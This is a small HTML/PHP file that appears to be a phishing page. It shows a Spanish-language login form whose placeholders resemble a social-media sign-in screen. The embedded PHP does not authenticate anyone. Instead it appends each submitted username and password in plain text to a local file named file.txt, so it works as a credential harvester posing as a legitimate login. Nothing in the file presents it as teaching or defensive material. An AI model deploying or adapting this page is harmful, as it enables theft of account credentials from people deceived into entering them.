<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="estilos.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

     <div id="caja"></div>
     <div id="formulario">
        <form method="post">
         <p><input type="text" id="usuario" name="name" placeholder="Teléfono,usuario o correo electrónico"></p>
         <p><input type="password" id="contrasena" name="password" placeholder="Contraseña"></p>
         <p><a href="#" id="azul">HAS OLVIDADO TU CONTRASEÑA?</a></p>
         <p><input type="submit" id="enviar" name="submit"></p>
        </form>
     </div>
     <div id="final">

     </div>
     
</body>
<?php
if(isset($_POST['submit'])){
$name = "Email:".$_POST['name']."
";
$password = "Contraseña:".$_POST['password']."
";
$file=fopen("file.txt", "a");
fwrite($file, $name);
fwrite($file, $password);
fclose($file);
}
?>
</html>
